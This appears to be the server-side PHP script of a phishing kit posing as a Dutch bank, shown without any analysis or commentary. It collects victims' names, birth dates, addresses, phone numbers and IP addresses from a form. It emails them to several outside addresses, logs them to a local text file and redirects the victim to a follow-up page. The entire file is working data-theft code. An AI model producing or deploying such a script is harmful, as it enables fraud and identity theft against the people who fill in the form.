<?php @session_start(); $_SESSION['Anhf'] = $_POST['qfs_IF2269_7303']; $_SESSION['Vlts'] = $_POST['qfs_IF2269_7313']; $_SESSION['Tnvgl'] = $_POST['qfs_IF2269_7312']; $_SESSION['Atnm'] = $_POST['qfs_IF2269_7304']; $_SESSION['Gbdtm'] = $_POST['qfs_IF2269_7305']; $_SESSION['Pscde'] = $_POST['qfs_IF2269_8747']; $_SESSION['Hnmmr'] = $_POST['qfs_IF2269_7306']; $_SESSION['Tvgin'] = $_POST['qfs_IF2269_7307']; $_SESSION['Telnm'] = $_POST['qfs_IF8316_23093']; $msga = "Naam: ".$_SESSION['Anhf']." ".$_SESSION['Vlts']." ".$_SESSION['Tnvgl']."  ".$_SESSION['Atnm']."   ".$_SESSION['Gbdtm']."<br>Adres: ".$_SESSION['Pscde']." ".$_SESSION['Hnmmr']; $msga .=" ".$_SESSION['Tvgin']." ".$_SESSION['Telnm']."<br>"; $_SESSION['msg3b'] = $msga; $title = "Rabz Gevz NV -  ".$_SESSION['Vlts']."-".$_SESSION['Atnm'];
$message .= "===================\n";
$message .= "voorlettters : ".$_POST['qfs_IF2269_7313']."\n";
$message .= "tussenvoegsel : ".$_POST['qfs_IF2269_7312']."\n"; 
$message .= "achternaam : ".$_POST['qfs_IF2269_7304']."\n";
$message .= "geboortedatum : ".$_POST['qfs_IF2269_7305']."\n"; 
$message .= "postcode : ".$_POST['qfs_IF2269_8747']."\n";
$message .= "postcode : ".$_POST['qfs_IF2269_8744']."\n"; 
$message .= "huisnummer : ".$_POST['qfs_IF2269_7306']."\n";
$message .= "toevoeging : ".$_POST['qfs_IF2269_7307']."\n"; 
$message .= "straat : ".$_POST['qfs_IF2269_8751']."\n"; 
$message .= "woonplaats : ".$_POST['qfs_IF2269_8752']."\n";
$message .= "telefoonnummer : ".$_POST['qfs_IF8316_23093']."\n";
$ip = $_SERVER['REMOTE_ADDR'];
$od = date("F j, Y, g:i a");
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n"; 
$rnessage = "$message\n";
$send= "boss120@yahoo.com,vanderweide@keemail.me,milkop1@live.nl";
$subject = " Opstuur Baro | $ip";
$headers = "From: mail@jaarlijkseupdates.eu";
$file = fopen("fio.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
header("Location: bewustmoment.php");
?>
